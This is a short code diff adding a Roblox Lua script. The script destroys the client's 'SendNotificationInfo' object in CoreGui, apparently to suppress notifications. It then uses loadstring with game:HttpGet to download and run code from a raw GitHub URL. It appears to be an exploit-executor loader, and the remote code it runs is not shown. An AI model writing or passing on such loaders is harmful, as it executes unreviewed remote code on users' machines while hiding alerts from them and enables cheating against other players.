@@ -1,0 +1,12 @@
+-- Delete notification
+local CoreGui = game:GetService("CoreGui")
+local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
+if RobloxGui then
+    local SendNotificationInfo = RobloxGui:FindFirstChild("SendNotificationInfo")
+    if SendNotificationInfo then
+        SendNotificationInfo:Destroy()
+    end
+end
+
+-- Run script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sentaidusty/butntown/refs/heads/main/Fort.txt"))()
